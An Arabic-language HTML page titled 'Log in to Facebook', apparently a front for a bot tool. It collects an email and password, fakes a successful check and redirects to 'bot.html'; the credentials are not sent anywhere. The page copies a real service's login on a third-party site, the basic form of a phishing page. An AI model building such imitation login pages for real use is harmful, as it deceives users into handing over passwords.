<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            text-align: center;
            padding: 50px;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.1);
        }
        input {
            margin: 10px;
            padding: 10px;
            width: 80%;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .loading img {
            width: 50px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>تسجيل الدخول إلى فيسبوك</h2>
    <input type="text" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة المرور">
    <button onclick="login()">تسجيل الدخول</button>
    <div class="loading" id="loading">
        <img src="https://i.imgur.com/LLfPFFX.gif" alt="تحميل...">
        <p>جارٍ التحقق من البيانات...</p>
    </div>
</div>

<script>
    function login() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (email && password) {
            // إظهار أيقونة التحميل
            document.getElementById('loading').style.display = 'block';

            // محاكاة عملية تحقق البيانات (هنا يمكنك استبدال هذا بجزء التحقق من البيانات)
            setTimeout(() => {
                // إخفاء أيقونة التحميل
                document.getElementById('loading').style.display = 'none';

                // التحقق من البيانات (محاكاة تحقق ناجح)
                const isValid = true; // هنا يمكنك إضافة تحقق البيانات الفعلي
                
                if (isValid) {
                    alert('تم تسجيل الدخول بنجاح!');

                    // الانتقال إلى صفحة البوت
                    window.location.href = "bot.html"; // استبدل "bot.html" بعنوان صفحة البوت
                } else {
                    alert('البيانات غير صحيحة. يرجى التحقق من البريد الإلكتروني وكلمة المرور.');
                }
            }, 3000); // محاكاة وقت التحقق (3 ثواني)
        } else {
            alert('يرجى إدخال البريد الإلكتروني وكلمة المرور');
        }
    }
</script>

</body>
</html>
